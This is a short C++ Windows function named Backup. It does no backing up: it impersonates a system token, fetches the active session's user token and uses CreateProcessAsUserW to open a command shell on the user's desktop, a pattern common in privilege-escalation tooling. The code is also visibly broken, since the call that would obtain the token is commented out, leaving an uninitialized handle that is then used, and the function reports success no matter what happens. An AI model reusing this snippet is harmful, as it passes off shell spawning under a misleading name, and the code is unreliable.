void Backup()
{
	HANDLE hSystemToken;
	//if (GetSystemToken(&hSystemToken))
	{
		if (ImpersonateLoggedOnUser(hSystemToken))
		{
			WINSTATIONUSERTOKEN WinStaUserToken = { 0 };
			DWORD ccbInfo = NULL;

			WinStationQueryInformationW(SERVERNAME_CURRENT, LOGONID_CURRENT, WinStationUserToken, &WinStaUserToken, sizeof(WINSTATIONUSERTOKEN), &ccbInfo);

			HRESULT hr = GetLastError();

			STARTUPINFOW StartupInfo = { 0 };
			PROCESS_INFORMATION ProcessInfo = { 0 };
			StartupInfo.lpDesktop = L"WinSta0\\Default";

			wchar_t szCMDLine[] = L"cmd /c start cmd";

			if (CreateProcessAsUserW(WinStaUserToken.UserToken, NULL, szCMDLine, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &ProcessInfo))
			{

			}


			RevertToSelf();

			ReturnMessage(L"OK");
		}

		CloseHandle(hSystemToken);
	}
}